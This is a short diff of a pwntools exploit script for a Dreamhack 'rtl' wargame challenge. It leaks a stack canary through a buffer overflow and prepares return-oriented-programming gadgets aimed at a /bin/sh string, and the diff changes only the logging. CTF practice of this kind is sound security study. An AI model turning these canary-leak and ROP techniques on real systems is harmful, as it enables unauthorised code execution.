@@ -3,13 +3,12 @@ from pwn import *
 #p = process('./rtl')
 p = remote('host1.dreamhack.games', 22347)
 #gdb.attach(p, api=True)
-def slog(n, m): return success(': '.join([n, hex(m)]))
 
 buf = b"a"*57
 p.sendafter(b'Buf: ',buf)
 p.recvuntil(buf)
 canary = u64(b"\x00"+p.recv(7))
-slog('Canary', canary)
+log.info('Canary' +  hex(canary))
 
 pop_rdi_ret = 0x0000000000400853 # ROPgadget --binary ./rtl | grep "pop rdi ; ret"
 bin_sh = 0x400874 # search -t string /bin/sh
